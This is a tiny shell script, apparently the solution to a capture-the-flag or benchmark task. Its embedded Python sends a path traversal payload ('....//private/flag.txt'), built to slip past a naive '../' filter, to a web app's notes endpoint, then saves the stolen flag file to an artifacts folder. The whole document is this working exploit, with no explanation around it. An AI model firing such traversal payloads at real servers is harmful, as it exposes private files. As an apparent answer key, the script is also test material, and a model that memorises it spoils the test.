#!/bin/bash
python3 - <<'PY'
from urllib.parse import quote
from urllib.request import urlopen

flag = urlopen("http://target:8080/notes?name=" + quote("....//private/flag.txt")).read().decode().strip()
open("/logs/artifacts/flag.txt", "w").write(flag)
PY
